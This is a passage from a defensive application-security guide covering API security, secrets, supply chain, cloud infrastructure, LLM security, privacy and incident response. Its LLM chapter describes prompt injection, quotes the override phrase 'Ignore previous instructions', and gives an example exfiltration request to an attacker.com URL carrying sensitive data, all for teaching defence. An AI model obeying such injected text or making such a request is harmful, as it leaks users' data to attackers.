- Modern cipher suites only --- your TLS library's defaults are usually
  right; check with SSL Labs.

- Certificate management automated (Let's Encrypt + cert-manager, or
  your cloud provider's ACM).

- HSTS header set, with includeSubDomains and preload if you can commit.

- Certificate transparency monitoring (or rely on your provider's).

**Key management**

The hardest part of cryptography. The keys are more valuable than the
data they protect. Some patterns:

- Never commit keys to source control. Use environment variables for
  development, a secret manager for production.

- Rotate keys periodically. Build the rotation mechanism before you need
  it.

- Use a cloud KMS (AWS KMS, GCP Cloud KMS, Azure Key Vault) for
  high-value keys --- the key never leaves the HSM.

- Separate keys per environment. Compromise of staging shouldn't affect
  production.

- Have a documented procedure for what to do when a key is compromised.

**Chapter 7 --- API security**

APIs are the dominant interface for modern applications, and they have
their own failure modes distinct from traditional web apps. OWASP
maintains a separate API Security Top 10.

**Authentication**

APIs are authenticated via tokens, not cookies (mostly). Options:

- **Bearer tokens (Authorization: Bearer <token>).** Standard. The
  token is opaque (a session ID) or self-contained (JWT).

- **API keys.** Long-lived secrets, typically for server-to-server.
  Treat as passwords --- store hashed if you can, rotate them, scope
  them.

- **mTLS.** Client certificates. Strong but operationally heavy. Used in
  zero-trust internal communication.

- **OAuth 2.0 access tokens.** For third-party access. Short-lived,
  scoped to specific permissions.

**Authorization at the API layer**

Apply authorization on every endpoint, not just at the API gateway.
Common patterns that fail:

- Checking authentication but not authorization ("the user is logged
  in, so let them access this")

- Trusting fields in the request body that should come from the session
  (userId, tenantId, role)

- Authorizing at the route level but not at the data level (the user can
  call GET /orders, but should they see all orders?)

Multi-tenant SaaS is especially error-prone. Treat tenant ID as a
security boundary, not just a field:

```js
// Wrong --- trusts client-supplied tenantId
app.get('/api/data', (req, res) => {
  const { tenantId } = req.query;
  return db.data.find({ tenantId });
});

// Right --- derives tenantId from session, never trusts the client
app.get('/api/data', requireAuth, (req, res) => {
  const tenantId = req.user.tenantId; // server-side
  return db.data.find({ tenantId });
});
```

**Rate limiting**

Every public endpoint needs a rate limit. The login endpoint and
password reset endpoint need aggressive ones. Otherwise:

- Brute force attacks against authentication

- Resource exhaustion (denial of service, cost amplification on cloud)

- Enumeration attacks ("is this email registered?")

- Scraping of paginated data

Rate limit per IP and per authenticated user. Apply different limits to
different endpoints. Use a sliding window or token bucket; fixed windows
leak through at the boundaries.

**Input validation**

Validate every input at the API boundary. Type, format, range, length.
Use a schema validator (Zod, Joi, Yup) rather than hand-rolled checks.

```js
import { z } from 'zod';

const CreateOrderSchema = z.object({
  productId: z.string().uuid(),
  quantity: z.number().int().positive().max(100),
  notes: z.string().max(500).optional()
});

app.post('/api/orders', requireAuth, (req, res) => {
  const result = CreateOrderSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.issues });
  }
  // result.data is now typed and trusted
});
```

Validation is also defense in depth --- the database has constraints,
the ORM has types, the API layer has schemas. Each layer should reject
what shouldn't pass.

**GraphQL-specific concerns**

GraphQL has its own attack surface:

- Query depth attacks --- deeply nested queries amplify load. Use depth
  limits.

- Query complexity attacks --- fan-out queries that return millions of
  records. Use complexity scoring.

- Introspection in production --- disable unless you have a reason.

- Batching attacks --- sending many queries in one request to bypass
  rate limits.

- Authorization is per-field, not per-endpoint, which makes it both more
  flexible and easier to mess up.

**Webhooks (receiving)**

If you receive webhooks from third parties (Stripe, GitHub, Slack), the
webhook signature is the only thing distinguishing a real event from an
attacker-crafted one. Always verify signatures:

```js
// Stripe webhook signature verification
app.post('/webhooks/stripe', express.raw({type: 'application/json'}), (req, res) => {
  const sig = req.headers['stripe-signature'];
  try {
    const event = stripe.webhooks.constructEvent(req.body, sig, WEBHOOK_SECRET);
    // event is verified --- handle it
  } catch (err) {
    return res.status(400).send('Invalid signature');
  }
});
```

Other webhook rules:

- Use idempotency keys --- the same event might be delivered multiple
  times

- Verify before processing --- never act on data from an unverified
  webhook

- Use the raw body for signature verification (your framework's JSON
  parser may modify it)

- Reply 2xx quickly and queue the work --- webhook providers retry on
  timeout

**Chapter 8 --- Secrets, supply chain, and infrastructure**

**Secrets management**

Secrets are credentials, API keys, signing keys, and anything else that
grants access if leaked. They have specific rules:

- Never commit them to source control. Not in any file, not even in a
  private repo, not even temporarily.

- Don't bake them into container images or build artifacts.

- Don't log them. Be careful: a debug log of a request might include
  the Authorization header.

- Don't pass them on command lines (visible in process listings).

- Rotate them on a schedule, and immediately on any suspicion of
  compromise.

Where they should live:

- **Development:** .env files (gitignored), or a tool like direnv. Each
  developer has their own.

- **CI/CD:** the CI provider's secret store (GitHub Actions secrets,
  etc.). Masked in logs.

- **Production:** a dedicated secret manager (AWS Secrets Manager,
  HashiCorp Vault, Doppler, 1Password Secrets Automation). Pulled at
  runtime, never persisted to disk.

> **If you commit a secret, rotate it**
>
> Don't just delete the commit. Git history is forever, and the secret
> has been read by anyone who cloned during the window. Treat it as
> compromised, rotate immediately, and add a pre-commit hook (e.g.,
> gitleaks, trufflehog) to prevent recurrence.

**Secret scanning**

Tools that scan repos and commits for leaked secrets. Run them as a
pre-commit hook locally and as a CI check. The major options:

- GitHub Secret Scanning (built into every repo, free, partners with
  providers to auto-revoke)

- Gitleaks (open source, CI-friendly)

- TruffleHog (open source, also scans entropy)

- Detect-secrets (Yelp, integrates with pre-commit)

**Supply chain hardening**

Dependencies are the largest source of vulnerable code in your
application. You wrote a few thousand lines; you imported a few hundred
thousand.

The practices that move the needle, in order of ROI:

- Commit lockfiles. Use npm ci (or equivalent) in production, not npm
  install.

- Run a dependency scanner on every PR. Block merges with high-severity
  unpatched CVEs.

- Audit your direct dependencies --- are they actively maintained? What
  do they pull in transitively?

- Use --ignore-scripts or equivalent when installing new packages; only
  enable scripts you trust.

- Pin GitHub Actions to commit SHAs, not version tags (tags can be
  moved).

- Generate and publish an SBOM (CycloneDX or SPDX format). Required by
  some customers and governments.

- Enable provenance attestations on packages you publish (npm
  provenance, GitHub Artifact Attestations).

**Infrastructure security**

The cloud has shifted most production infrastructure to IaaS/PaaS, and
most security failures there are configuration failures. The discipline:

**IAM and access control**

- Principle of least privilege: every IAM role gets exactly the
  permissions it needs

- No use of root accounts for daily operations

- MFA on all human accounts

- Service accounts authenticated via short-lived credentials (instance
  roles, OIDC federation), not long-lived access keys

- Resource-based policies (S3 bucket policies, etc.) explicit and
  reviewed

- Cross-account access audited; no "AssumeRole *"

**Network segmentation**

- Production resources in private subnets; only load balancers in public
  subnets

- Security groups default-deny, explicit allows for required traffic

- Database not reachable from the public internet, ever

- Service-to-service communication on a private network or VPN

**Container security**

- Minimal base images (distroless, alpine, or scratch)

- Run as non-root user (USER directive in Dockerfile)

- Read-only root filesystem where possible

- No secrets in image layers --- they're cached and visible to anyone
  with the image

- Scan images for CVEs in CI (Trivy, Snyk, Grype)

- Sign images, verify signatures at deployment (Cosign + admission
  policy)

**Logging and monitoring infrastructure**

- CloudTrail (AWS) / Cloud Audit Logs (GCP) / Activity Log (Azure)
  enabled, retained, alerting configured

- VPC flow logs for network anomalies

- GuardDuty / Security Command Center / Defender for Cloud --- managed
  threat detection, low ROI to set up, high ROI to have

**Zero trust**

A modern architectural principle: don't trust any network location.
Every request, internal or external, must be authenticated and
authorized as if it came from the public internet.

Practical implications:

- Service-to-service calls authenticated (mTLS, signed JWTs, or
  platform-native identity)

- Authorization enforced at every service boundary, not just at the
  perimeter

- VPN displaced by identity-aware proxies (Cloudflare Access, Tailscale,
  Google IAP) for access to internal apps

- Database queries authenticated as the originating user where possible
  (row-level security)

**Chapter 9 --- AI and LLM-specific security**

Applications that integrate LLMs have an attack surface that didn't
exist three years ago. OWASP has a dedicated Top 10 for LLM
Applications; the practical concerns are summarized here.

**Prompt injection**

The defining vulnerability of LLM applications. Any text the LLM reads
--- user input, retrieved documents, web page content, file contents ---
can contain instructions, and the LLM cannot reliably distinguish
instructions from data.

Two flavors:

- **Direct prompt injection:** the user types instructions into the chat
  ("Ignore previous instructions and...")

- **Indirect prompt injection:** instructions are hidden in data the LLM
  processes --- a webpage the agent visits, a document a user uploads,
  an email the LLM summarizes.

Indirect injection is especially dangerous in agent contexts because the
user trusts the agent and is not in the loop on every action.

Defenses (none of which are complete):

- Treat LLM output as untrusted input to any downstream system.
  Validate, escape, restrict.

- Limit the actions an LLM can take. An agent that can read your email
  and send HTTP requests is a data exfiltration tool waiting to be
  triggered.

- Confirm high-stakes actions out-of-band (have the user click a button
  rather than relying on the LLM's intent).

- Mark untrusted regions of the prompt clearly --- though models
  routinely ignore the markers.

- Monitor for unusual patterns (sudden tool calls, attempts to read
  sensitive files).

> **The fundamental rule of LLM applications**
>
> Any data the LLM can read can change its behavior. Any action the LLM
> can take can be triggered by data it reads. Design with these as
> assumptions, not edge cases.

**Data exfiltration via tool use**

An LLM agent with both web access and access to sensitive data can be
tricked into exfiltrating that data --- "fetch
https://attacker.com/?data={sensitive_value}" works alarmingly often.
Defenses:

- Egress allowlist for agent web access --- only domains you trust

- Strip URL parameters from LLM-generated requests

- Audit tool calls before execution for unusual patterns

- Separate the agent's data access from its outbound capability where
  possible

**Training data leakage and model inversion**

If you fine-tune a model on private data, the model may memorize parts
of that data and leak it under specific prompting. Implications:

- Don't fine-tune on production data containing PII without careful
  curation

- Don't train on customer data across customers --- tenant A's data
  should never appear in a model that responds to tenant B

- Consider whether to log user prompts at all (they often contain
  sensitive content)

- Be cautious about "upload your CSV to fine-tune" features ---
  they're a data-exposure shape with little user understanding

**Output filtering**

LLMs will sometimes produce outputs you didn't intend --- including PII
from training data, harmful content, or text that triggers downstream
system bugs. If your application's output goes to users at scale,
consider:

- PII detection on outputs (Presidio, cloud provider PII APIs)

- Profanity / safety filtering using a moderation API

- Length and structure validation (the model returns JSON that parses,
  code that compiles, etc.)

**Cost amplification attacks**

LLM API calls are expensive. Endpoints that accept user input and
forward to an LLM are denial-of-wallet targets. A user sending 10,000
requests with maximum context length can cost you thousands of dollars
per hour.

Defenses:

- Rate limit per user and per IP, more aggressively than for regular
  endpoints

- Cap input and output token counts at the request level

- Set budget alerts on the provider's dashboard

- Require authentication for any endpoint that hits an LLM API

**MCP and tool security**

If you build MCP servers (or use them), every tool you expose is an
attack surface. The MCP server runs with your privileges; the LLM
calling it might be acting on adversarial input.

- Validate tool inputs as you would any API input

- Scope tools narrowly --- "read this specific file" not "read any
  file"

- Don't expose dangerous tools (exec, delete, send-money) without
  explicit human confirmation

- Audit log every tool call

**Chapter 10 --- Privacy and data protection**

Privacy is adjacent to security but distinct: security is about
preventing unauthorized access; privacy is about appropriate handling of
authorized access. A breach is a security failure; selling user data to
a third party without consent is a privacy failure, not a security one.

**Data minimization**

The most powerful privacy practice: don't collect what you don't need.
Every piece of data you store is a future liability --- to comply with
deletion requests, to protect from breach, to handle in subpoenas.
Specifically:

- Don't ask for personal information at signup unless you need it for
  the product to work

- Don't store IP addresses in logs longer than necessary for security
  investigations

- Don't retain user content beyond what the user expects (chat
  messages, uploads, search history)

- Aggregate where possible --- store "5 logins this week" instead of
  "logins at 09:14:23, 10:51:02, ..."

**GDPR / CCPA / regional laws**

Privacy laws vary, but the core obligations are consistent across modern
frameworks:

- Tell users what data you collect and why (privacy policy)

- Get consent for non-essential data collection (especially analytics,
  marketing)

- Give users access to their data on request

- Honor deletion requests (the "right to be forgotten")

- Don't transfer data internationally without legal basis (Schrems II,
  Privacy Shield successor frameworks)

- Report breaches to regulators within strict deadlines (72 hours under
  GDPR)

- Process data on a legal basis --- consent, contract, legitimate
  interest, etc.

If you have EU customers, GDPR applies even if you're outside the EU.
California's CCPA/CPRA is the most prominent US state law; others are
following. Compliance is more about process than technology --- but the
technology has to support the process (data inventory, export,
deletion).

**PII and sensitive data**

Categories that need extra care:

- **PII:** name, email, phone, address, IP --- basic identifiers

- **Financial:** payment cards (PCI-DSS scope), bank info --- outsource
  to a processor like Stripe if at all possible

- **Health (HIPAA in US):** medical records --- requires specific legal
  and technical controls

- **Authentication:** passwords, MFA secrets, recovery codes

- **Children's data (COPPA in US):** under-13 in the US, varying ages
  elsewhere

- **Biometrics:** face/fingerprint data, varies by jurisdiction
  (Illinois BIPA is notable)

Defaults that protect you:

- Encrypt PII at rest, not just in transit

- Audit log access to sensitive data --- who read what, when

- Separate the systems that handle payments and authentication from your
  main app

- Tokenize where possible (store a token referring to the data, not the
  data)

**Logging vs privacy**

Logs are useful for debugging and security but they accumulate the most
sensitive data in your system. Practices:

- Redact PII in logs --- emails, phone numbers, tokens, full request
  bodies

- Don't log Authorization headers, cookies, or query parameters that
  might contain secrets

- Retain logs only as long as needed (30-90 days for most operational
  logs; longer only with legal justification)

- Restrict who can access production logs

**Chapter 11 --- Logging, monitoring, incident response**

Most breaches are not prevented; they are detected. The mean time from
compromise to detection is still measured in months across the industry.
Logging and monitoring are how you compress that timeline.

**What to log**

Security-relevant events that should always be logged:

- Authentication attempts (success and failure, with IP, user agent,
  timestamp)

- Authorization failures (user X attempted action Y on resource Z,
  denied)

- Account changes (password reset, email change, MFA enable/disable)

- Permission changes (role assignments, group membership)

- Data exports (user downloaded their data, admin exported user list)

- High-value actions (payment, deletion, configuration change)

- Tool calls in agentic systems

Each log entry should have: timestamp, request ID, user ID (if
authenticated), source IP, action, resource, result. Structured (JSON)
not free-text.

**What NOT to log**

- Passwords, ever

- Authentication tokens, session IDs, API keys

- Full request bodies if they might contain PII

- Authorization headers

- Cryptographic material

- PII unless required for the specific log purpose, and then with
  retention limits

**Monitoring and alerting**

Logs are useful only when something is paying attention. The patterns to
alert on:

- Brute-force login attempts (N failures from one IP in a window)

- Privilege escalation events (user gained admin role)

- Unusual data exports (volume, time of day, source)

- Authentication from new countries or IPs (impossible travel)

- New IAM roles or policies created in production

- API rate limit hits sustained over time

- Errors that don't normally happen (auth check exceptions, integrity
  check failures)

**Incident response**

Before an incident is the time to prepare for one. The minimum:

- A documented escalation path. Who gets paged? Who has authority to
  make decisions?

- Pre-written communications templates. "We are investigating a
  security incident affecting..."

- Established forensics access --- who can pull logs, who can isolate
  resources

- Backup access methods if the primary auth is compromised (break-glass
  accounts, offline credentials)

- Legal counsel familiar with breach notification laws in your
  jurisdictions

- A post-incident review process that's blameless and produces concrete
  improvements

During an incident, the standard sequence: contain (stop ongoing
damage), eradicate (remove the attacker's access), recover (restore
service), learn (post-mortem). Don't skip the post-mortem; it's where
the next incident gets prevented.

**Chapter 12 --- Building security into the development process**

None of the above matters if it's not built into how you work. The
disciplines that turn security from heroics into routine:

**In design**

- Threat-model new features. STRIDE on a whiteboard with two engineers
  takes 20 minutes and finds real bugs.

- Use established patterns for risky areas (auth, payments, file
  handling). Don't innovate where you don't have to.

- Define trust boundaries explicitly. Where does untrusted data become
  trusted? What's the validation?

**In code**

- Static analysis on every PR (ESLint security rules, Semgrep, CodeQL)

- Secret scanning on every commit

- Dependency scanning on every PR; block on high-severity unpatched CVEs

- Code review by someone other than the author, with security as a
  review dimension

- Test for security cases (auth required, authz enforced, input
  validated) as you would for happy-path

**In CI/CD**

- Pipelines run with least privilege. Secrets injected at the moment of
  use, not persisted.

- Builds reproducible. Same inputs produce same outputs.

- Artifacts signed. Deployment verifies signatures.

- Production deploys require approval, audit trail.

- Rollback paths exist and are tested.

**In production**

- Monitoring covers security events, not just operational health

- Patches applied promptly --- most exploited CVEs were known and
  patched weeks before exploitation

- Regular reviews of access (who has production access, who has unused
  IAM roles)

- Penetration testing periodically (annual for most SaaS, more often for
  high-stakes applications)

- Bug bounty if your scale and budget allow

**Building a security culture**

The highest-leverage move is making security everyone's concern rather
than a separate team's. This looks like:

- Developers can describe the security model of their service

- Code review catches security bugs without a dedicated reviewer

- Engineers raise concerns about risky designs early

- Production incidents are learning events, not blame events

- Security tools are integrated, not bolted on --- fast feedback, low
  friction

> **The closing thought**
>
> Security is a tax on velocity if you bolt it on. It's free --- and
> often a productivity gain --- when it's built in. Parameterized
> queries are faster to write than escaped strings. Strong auth
> libraries are faster to integrate than home-rolled ones. Treating
> untrusted input as untrusted from the start saves the rewrite when
> you realize you didn't.

This guide is a starting point. The list of attacks expands; the
defenses evolve. But the principles --- never trust input, defense in
depth, least privilege, fail closed --- have been stable for decades and
are likely to remain so. Internalize those, and the specific techniques
become details you can look up when you need them.

Build with care. Ship with confidence.
